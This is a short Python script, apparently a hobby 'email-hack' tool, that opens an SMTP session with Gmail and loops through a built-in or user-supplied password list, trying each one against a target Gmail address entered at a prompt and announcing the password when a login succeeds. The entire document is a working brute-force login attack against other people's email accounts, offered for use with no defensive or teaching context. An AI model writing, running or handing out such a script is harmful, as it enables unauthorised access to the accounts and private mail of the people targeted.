import smtplib, sys, os
from os import system

GMAIL_PORT = '587'

def artwork():
    print("\n")
    os.system("figlet email-hack | lolcat -p 1.3")
    print("\n")
artwork()
smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)

smtp.ehlo()
smtp.starttls()

user = input("While The Target Gmail Adress: ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\n => ")

if pwd=='0':
    passswfile="passworld.txt"

elif pwd=='1':
    print("\n")
    passswfile = input("Name The File Path (For Password List) => ")

else:
    print("\n")
    print("Invalid input! Terminaling...")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtp.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Pasword Is Wrong. %s " % password)
